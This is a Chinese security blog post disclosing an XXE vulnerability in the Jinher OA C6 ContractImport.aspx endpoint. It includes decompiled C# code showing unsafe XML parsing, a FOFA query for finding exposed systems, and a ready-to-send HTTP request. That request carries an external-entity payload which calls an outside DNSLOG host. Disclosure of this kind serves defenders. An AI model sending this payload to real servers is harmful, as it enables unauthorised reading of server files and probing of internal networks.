---
title: "金和OA ContractImport.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-ContractManagement-ContractImport-xxe.html
asset_dir: assets/金和oa-contractimport.aspx-xxe漏洞
---

# 金和OA ContractImport.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/12/5 13:32
- 280浏览
- [0评论](#comment)
- 12分钟阅读

深入探索

SQL注入防护

Nessus

编码转换工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `ContractImport.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `ContractImport.aspx` 在 `bin` 目录下查找 `JHSoft.Web.ContractManagement.dll` 将其进行反编译后找到 **ContractImport** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  ((Control) this).Page.Response.Write(this.ImportData());
  ((Control) this).Page.Response.End();
}
```

跟进 `ImportData` 方法

```
protected string ImportData()
{
  string str1 = string.Empty;
  DateTime now = DateTime.Now;
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  XmlNode documentElement = (XmlNode) xmlDocument.DocumentElement;
```

深入探索

编程语言教程

文本剥离工具

防火墙软件

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

# 漏洞复现

```
POST /c6/JHSoft.Web.ContractManagement/Importing/ContractImport.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

在DNSLOG平台成功收到HTTP请求

网络安全

[![金和OA ContractImport.aspx XXE漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALZ0lEQVR4AeybgXbbuA5Effv//9xXZHJlESJlJ+3GPucpZ9EhZgYgQ0jdJG1/3W6339+J3w8+Vj0flB3O8lX/bN9VD73qPX/Er3T7fAdrIH/qrv/e5Qa2gfyZ9u2Z6AcHbnAPdXv1HO5eOK5Xfvkz7Hvqhexj3hFGHcbcvhAeRuz9zK17hPoLt4FUcsXrb+AwEBinD8lXR+3Th/ghaB2Muby46iMP5/XVB0aPtSJEh6B81VaYi8VVwOjvennOAlIPI85qDgOZmS7u527gnw0EMn2fHrF/KiseUg9B6yB5r4Pw+gr1iMWdBaRH90N4a9Vh5Ltu/jf4zwbyN4e4au838J8NBPI0+XSJMPL3o2SlryOkDoJxj79CNBhRlz3NO0LqVr7O97z3+07+nw3kO4e5am63w0CcesfVZQEf34cM+i6B6BBUguR9HwgPI+qz3nyG3QPzXtZC9J7bB6LDiOqP0L4dZ3WHgcxMF/dzN7ANBMbpwzxfHc3pQ+rM9a9yiF+f2P3yHSH1QJcOuT2B07f6UPhJWP+ZbgDzfhAeznFr9GexDeTP+vrvDW7gl1P/Kq7Obp+v6pCnaFW34t2vcOX5Lg85U/WugOT2gzGXL+9343pDvMU3wYcDgTwFMEefBIju5wVjLt/R+o6QevleB9HhiHohWu/x1dx+vU6+I2RfCHbdHI76w4FYfOHP3MA2EMi0ILja/tFTAqnXJ0J4mKP7QXTr5MUVX/qZVroB2QOCnTd/tp8+GPt1Hua6+xVuA6nkitffwHIgkGk6ZRFGHpL3TwXmfPfZV94cUg/B2+32YYHk+j7Iz18g2md6ABj13qPnNoB53crf67oPxn76C5cDKfGKn7+BbSBOUexHgUy16+aideZwXqdfhNFvH/VVXnz3FFex4iF7qYsQHoKdNxdh9NWe+4DoctaJEB04/nDxdn289AZ+QabjKSB5n6Y5RNcvwpxXF+1jLkLq1SE5BPV1hOhAl7Yc+PjZFQQ3oS0gumdo8pZCfBvxubAO5vqnbfvbPXD0bb9lab7wtTewDQQyrdWUYdT7sa0Tuw6ph2DXe77qow/SR1+hmgjxmHesmgr5WlescvmOVVMB8/1Kq4DoECyuxzaQvsmVv+YGDgOBcXqQ3ONBcpijvo4+CfKQenN1CA9BdRhz/eqFcjB6S6tQr3UFjD44zx/VV899QPpBcK/VGo78YSBlvOJ1N7ANxOmLkOmZe8RV3nl4rh7ie9RfXYTUwRE9S0drxQ/9d/2Fe5kgpOdKf5Zf+bLL/NdtIHP5Yn/6BraBQJ6KRweAuQ9G3qcDRt7+6iKMPnn9Iow++T1CPDDi3nO2dm9IffdCeH1df8R3HdIPuL5Tv73Zx/Zn6p4LMi1z0amK8o+w+yH9IdjrITyMqK/3k5/hygvpbQ0k735zEeLrdRAeguqi9eYQn/wet9+yNF/42hs4DGQ/rVpDpgkjllbh8WtdAaNPHcKbl7cCwtd6H92ntuJLVxMhvc3F8laschjrYMyrtmJVLw+pgxHVZ3gYyMx0cT93A9tAauIVkGl6hOJmoQ7xQ7B74Zy3jwjxm68Q4oM76vUMqxxSow7JIWg9jHn365N/hN0P6Q933AbyqNml/8wNbAOBTMkpQnKYo8fTL8pD6la8PnWY+/VBdAjK73HVC+Y1EN46cd+z1jD3QXgIWg98/PmLefWogPhqvQ99hdtA9oZr/bob+PKfGNYUKyDThqCfAiQvT4V8x9IqIP5Henkr9NW6wvwMy1cB417FVVgLz+kw98HIw5i7T+25D/nC6w2pW3ijOAzEyfUzQqYNwa73HOa+3r/nkDoI2hfO8/LB6CluH+4l7rWztX6xe+F8X/3Ww9p/GIjFF77mBrafZTk9jwHjFNU7PvLD2Kf7YdTtr2+F+ma4qnmWh5wJRuz17i1v3lF9hXDf53pDVrf0In75VdbqPJBpdt2novM9h7HeOlG/eUd1EdIPkDog8PF9AYx4MD4gIPWeaWWH+LoOIw9jXv7rDalbeKO4BvJGw6ijbP9Th+PrU4Yeq9cVUq8O89x++swhfnMR5ry6fQrlRBhry7MPGHXr9p79Wh3mderWmK9Q3x6vN2R1Wy/it4Hsp1Trfh7IUwEjdp959aiA+OU7QvTyVqhDePOOEB2O2L3VtwLi7Tqc8xC9elRYD+F7DuEhqF61FeYz3AYyEy/u529gGwhkmhCsSZ7F6qiQegjaQ785zPXuM4f4ze1jfoYw1kLyVQ84160T3bvnj3j1PW4D2ZPX+nU3sH1juJpuPxqcPz3db/6oP6Svfhhz+d7HfI/du9f2a30d9cD8DDDy+u1jLsLcDyNf9dcbUrfwRrEcCGR6EPTMfermXTeH1ENQvtfJw9zX/RAfHPErXsCtv43Ax49megMYeRjz7q98OZASr/j5GzgMpD9dHgkyXQh2fpXL3/F85f5id0P2X+nlh3hqvQ9rRLWeP+LVIfus6vWpi7CuOwzEJhe+5ga2n2W5PWR65h2dsvyjfOWD830gOgRXfdy/cOWRF2HsKS/CqFfvCvVa70NehNTrkV8hxA9c/xzh9mYf229ZkCl5PqfbEUYfjHmvN4fRZ1/1nq94GPtAcmD7B/nWivaGeOVFCK9PXoTo5iuE+FZ9VnV7fhvInrzWr7uB7Tt1j+B0IdOGYNdXuTzM6yA8nOOqT+c9byGc9yzPLFY9If3URRh5SG5vfSJEN+9oXeH1hvTbeXG+fZVV06no5ymuAjJlCHafOcx1CF+9KvR3LK2i8+alVZjvsfhZ7D2ztTUzrbiVDuefE5zr1bvH9Yb0G3lxfhgIZKqrc/m0iN0nL6qbw9hfXuz+zkPq5SE5HNFeIsTTcwhvT3VziA7BrpuLMPpgzPXN8DCQmenifu4GDgPxqfAIME4XkkNQX6/rPMSvT9QH0c1FmPPqe7SnCKk1F2Hk9z1qDdEhWFyF9bXeB8QHwe7r+b621pA64PpO/fZmH4fvQ1bnc8odIdO1Dua5dd0H8XddX8fuMy9ceSF7QLC8FZDcOkhe2j7UO8K53x4QHwTtA8n1FR5+y9J84WtuYPs+BDItj1HT2gdEh6A+Eea8PSA6BOWtfxYh9XBEe8Co9b0geuetFyG+VS6/Qkh938dc3Ndfb8j+Nt5gfRgIZKoQ9IxOU4S5rh+e0+3X6yD16pBcn6heOOOKh7G2uAr9YnEV5o+wvBUw9od5Xt4K+0J8cMfDQDRf+JobWH6VVZOs6MeCTFO+PBXwNb5qKuyzQkjf8lZ0H0SHNVpT9RUQr3xHUO9K8upRkez+K5zX3Z3r1fWGrO/mJcr2VVZNfB+r0+w9tYY8FbXeh/Vy5hC/uQhzvtfrl5+hHlEPzPfQB3PdenHlV+/4Ff/1hnhbb4Lb/0MgTwc8h/38kLoVD6MOySG4eqrsB/GZixAekFqie3TDIx6Y/s3EVR3M/e4La/16Q7ylN8FtIE77ET57bshTYD/rzEX5FcK8j377FMp1hPSA4EqvHvtY+SB9INh99njEQ+rhjttAevGVv+YGDgOB+7Tgvv7u8SA9ej2E92mC5BBc+eUhPjiiHtE9RPkVwthTn/Ud1WGsg+RdNxf3/Q4D0XTha27grweyn26tV59GaRWQp6bWFfprPQv1jmferkH2tIc6hDfv+iqH1EHwq/X6RUgf4PoTw9ubffz1G9I/H8i0O99ziA+CXTf3Keqovkc9e262hnFPSA7BWc0ZB6lzf0i+qoFRt67wnw9kdYiLf+4GDgOpKc3iuXa37W+g28M6GJ8KeRGe02Htg7nmWWDU5T1Dz+UhdRCUX/k7D2Od9XDkDwPRfOFrbmAbCGRacI6rY8K8Tn9/asxFfR0hfeXP/CsNnusB8UHQPUX7i52HeV33mYuQOuD6Kuv2Zh/bG/Jm5/q/Pc7/AAAA///+HELyAAAABklEQVQDAJLXm7aZWiScAAAAAElFTkSuQmCC)

手机扫码阅读
